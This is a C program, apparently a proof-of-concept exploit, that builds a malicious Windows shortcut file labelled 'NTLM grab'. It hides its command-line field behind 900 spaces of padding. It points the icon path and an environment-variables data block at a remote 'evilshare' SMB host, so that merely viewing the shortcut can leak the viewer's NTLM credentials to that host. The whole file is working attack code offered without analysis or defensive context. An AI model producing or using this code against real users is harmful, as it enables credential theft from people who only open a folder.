#include <windows.h>
#include <stdio.h>

#pragma pack(1)
#pragma warning(disable:4996)

typedef struct _ShellLinkHeader {
    DWORD       HeaderSize;      
    GUID        LinkCLSID;       
    DWORD       LinkFlags;       
    DWORD       FileAttributes;  
    FILETIME    CreationTime;    
    FILETIME    AccessTime;      
    FILETIME    WriteTime;       
    DWORD       FileSize;        
    DWORD       IconIndex;       
    DWORD       ShowCommand;     
    WORD        HotKey;          
    WORD        Reserved1;       
    DWORD       Reserved2;       
    DWORD       Reserved3;       
} SHELL_LINK_HEADER, * PSHELL_LINK_HEADER;

#define HAS_LINK_TARGET_IDLIST         0x00000001
#define HAS_LINK_INFO                  0x00000002
#define HAS_NAME                       0x00000004
#define HAS_RELATIVE_PATH              0x00000008
#define HAS_WORKING_DIR                0x00000010
#define HAS_ARGUMENTS                  0x00000020
#define HAS_ICON_LOCATION              0x00000040
#define IS_UNICODE                     0x00000080
#define FORCE_NO_LINKINFO              0x00000100
#define HAS_EXP_STRING                 0x00000200
#define RUN_IN_SEPARATE_PROCESS        0x00000400
#define HAS_LOGO3ID                    0x00000800
#define HAS_DARWIN_ID                  0x00001000
#define RUN_AS_USER                    0x00002000
#define HAS_EXP_ICON                   0x00004000
#define NO_PIDL_ALIAS                  0x00008000
#define FORCE_USHORTCUT                0x00010000
#define RUN_WITH_SHIMLAYER             0x00020000
#define FORCE_NO_LINKTRACK             0x00040000
#define ENABLE_TARGET_METADATA         0x00080000
#define DISABLE_LINK_PATH_TRACKING     0x00100000
#define DISABLE_KNOWNFOLDER_TRACKING   0x00200000
#define DISABLE_KNOWNFOLDER_ALIAS      0x00400000
#define ALLOW_LINK_TO_LINK             0x00800000
#define UNALIAS_ON_SAVE                0x01000000
#define PREFER_ENVIRONMENT_PATH        0x02000000
#define KEEP_LOCAL_IDLIST_FOR_UNC      0x04000000

#define SW_SHOWNORMAL       0x00000001
#define SW_SHOWMAXIMIZED    0x00000003
#define SW_SHOWMINNOACTIVE  0x00000007

#define ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE   0xA0000001
#define CONSOLE_DATABLOCK_SIGNATURE                   0xA0000002
#define TRACKER_DATABLOCK_SIGNATURE                   0xA0000003
#define CONSOLE_PROPS_DATABLOCK_SIGNATURE             0xA0000004
#define SPECIAL_FOLDER_DATABLOCK_SIGNATURE            0xA0000005
#define DARWIN_DATABLOCK_SIGNATURE                    0xA0000006
#define ICON_ENVIRONMENT_DATABLOCK_SIGNATURE          0xA0000007
#define SHIM_DATABLOCK_SIGNATURE                      0xA0000008
#define PROPERTY_STORE_DATABLOCK_SIGNATURE            0xA0000009
#define KNOWN_FOLDER_DATABLOCK_SIGNATURE              0xA000000B
#define VISTA_AND_ABOVE_IDLIST_DATABLOCK_SIGNATURE    0xA000000C
#define EMBEDDED_EXE_DATABLOCK_SIGNATURE              0xA000CAFE

int main() {
    const char* lnkFilePath = "poc.lnk";
    HANDLE hFile;
    DWORD bytesWritten;

    hFile = CreateFileA(lnkFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create LNK file: %lu\n", GetLastError());
        return 1;
    }

    SHELL_LINK_HEADER header = { 0 };
    header.HeaderSize = 0x0000004C;

    header.LinkCLSID.Data1 = 0x00021401;
    header.LinkCLSID.Data2 = 0x0000;
    header.LinkCLSID.Data3 = 0x0000;
    header.LinkCLSID.Data4[0] = 0xC0;
    header.LinkCLSID.Data4[1] = 0x00;
    header.LinkCLSID.Data4[2] = 0x00;
    header.LinkCLSID.Data4[3] = 0x00;
    header.LinkCLSID.Data4[4] = 0x00;
    header.LinkCLSID.Data4[5] = 0x00;
    header.LinkCLSID.Data4[6] = 0x00;
    header.LinkCLSID.Data4[7] = 0x46;

    header.LinkFlags = HAS_NAME |
        HAS_ARGUMENTS |
        HAS_ICON_LOCATION |
        IS_UNICODE |
        HAS_EXP_STRING;

    header.FileAttributes = FILE_ATTRIBUTE_NORMAL;

    SYSTEMTIME st;
    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &header.CreationTime);
    SystemTimeToFileTime(&st, &header.AccessTime);
    SystemTimeToFileTime(&st, &header.WriteTime);

    header.FileSize = 0;
    header.IconIndex = 0;
    header.ShowCommand = SW_SHOWNORMAL;
    header.HotKey = 0;
    header.Reserved1 = 0;
    header.Reserved2 = 0;
    header.Reserved3 = 0;

    if (!WriteFile(hFile, &header, sizeof(SHELL_LINK_HEADER), &bytesWritten, NULL)) {
        printf("Failed to write header: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    const char* description = "NTLM grab";
    WORD descLen = (WORD)strlen(description);
    if (!WriteFile(hFile, &descLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write description length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideBufSize = MultiByteToWideChar(CP_ACP, 0, description, -1, NULL, 0);
    WCHAR* wideDesc = (WCHAR*)malloc(wideBufSize * sizeof(WCHAR));
    if (!wideDesc) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, description, -1, wideDesc, wideBufSize);

    if (!WriteFile(hFile, wideDesc, descLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write description: %lu\n", GetLastError());
        free(wideDesc);
        CloseHandle(hFile);
        return 1;
    }
    free(wideDesc);

    const char* calcCmd = "";
    char cmdLineBuffer[1024] = { 0 };
    int cmdLen = strlen(calcCmd);
    int fillBytes = 900 - cmdLen;

    memset(cmdLineBuffer, 0x20, fillBytes);
    strcpy(cmdLineBuffer + fillBytes, calcCmd);
    cmdLineBuffer[900] = '\0';

    WORD cmdArgLen = (WORD)strlen(cmdLineBuffer);
    if (!WriteFile(hFile, &cmdArgLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write cmd length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideCmdBufSize = MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, NULL, 0);
    WCHAR* wideCmd = (WCHAR*)malloc(wideCmdBufSize * sizeof(WCHAR));
    if (!wideCmd) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, cmdLineBuffer, -1, wideCmd, wideCmdBufSize);

    if (!WriteFile(hFile, wideCmd, cmdArgLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write cmd: %lu\n", GetLastError());
        free(wideCmd);
        CloseHandle(hFile);
        return 1;
    }
    free(wideCmd);

    const char* iconPath = "\\\\192.168.254.43\\evilshare\\test.exe,0";
    WORD iconLen = (WORD)strlen(iconPath);
    if (!WriteFile(hFile, &iconLen, sizeof(WORD), &bytesWritten, NULL)) {
        printf("Failed to write icon length: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    int wideIconBufSize = MultiByteToWideChar(CP_ACP, 0, iconPath, -1, NULL, 0);
    WCHAR* wideIcon = (WCHAR*)malloc(wideIconBufSize * sizeof(WCHAR));
    if (!wideIcon) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return 1;
    }

    MultiByteToWideChar(CP_ACP, 0, iconPath, -1, wideIcon, wideIconBufSize);

    if (!WriteFile(hFile, wideIcon, iconLen * sizeof(WCHAR), &bytesWritten, NULL)) {
        printf("Failed to write icon path: %lu\n", GetLastError());
        free(wideIcon);
        CloseHandle(hFile);
        return 1;
    }
    free(wideIcon);

    const char* envUNC   = "\\\\192.168.254.43\\evilshare\\test.exe";

    DWORD envBlockSize = 0x00000314;
    DWORD envSignature = ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;

    printf("Creating Environment Variables Data Block:\n");
    printf("  Using fixed block size: 0x%08X (%lu bytes)\n", envBlockSize, envBlockSize);

    if (!WriteFile(hFile, &envBlockSize, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block size: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Write block size: %lu bytes written\n", bytesWritten);

    if (!WriteFile(hFile, &envSignature, sizeof(DWORD), &bytesWritten, NULL)) {
        printf("Failed to write env block signature: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Wrote block signature: %lu bytes written\n", bytesWritten);

    char ansiBuffer[260] = { 0 };
    strncpy(ansiBuffer, envUNC, 259);

    if (!WriteFile(hFile, ansiBuffer, 260, &bytesWritten, NULL)) {
        printf("Failed to write TargetAnsi: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Write TargetAnsi: %lu bytes written (fixed 260 bytes)\n", bytesWritten);

    WCHAR unicodeBuffer[260] = { 0 };
    if (MultiByteToWideChar(CP_ACP, 0, envUNC, -1, unicodeBuffer, 260) == 0) {
        printf("Failed to convert to Unicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, unicodeBuffer, 520, &bytesWritten, NULL)) {
        printf("Failed to write TargetUnicode: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }
    printf("  Write TargetUnicode: %lu bytes written (fixed 520 bytes)\n", bytesWritten);

    CloseHandle(hFile);

    printf("LNK file created successfully: %s\n", lnkFilePath);
    printf("Command line buffer size: %d bytes\n", (int)strlen(cmdLineBuffer));

    return 0;
}